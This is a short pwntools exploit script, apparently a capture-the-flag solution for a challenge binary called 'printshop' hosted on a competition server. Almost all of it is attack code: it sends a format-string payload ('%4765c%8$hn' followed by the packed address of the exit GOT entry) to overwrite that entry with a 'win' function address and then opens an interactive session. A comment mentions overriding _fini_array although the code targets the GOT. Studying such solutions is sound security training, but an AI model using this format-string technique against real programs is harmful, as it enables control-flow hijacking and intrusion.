from pwn import *
elf = context.binary = ELF("./printshop")
r = elf.process()
r = remote("chal.pctf.competitivecyber.club", 7997)


# gdb.attach(r, '''
#     b* main+113\n
#     b* _fini+12\n
#     c
# ''')

win = 0x40129d
# Override _fini_array. !!!! 

payload = b"%4765c%8$hn|||||" + p64(elf.got["exit"])
r.sendline(payload)
r.interactive()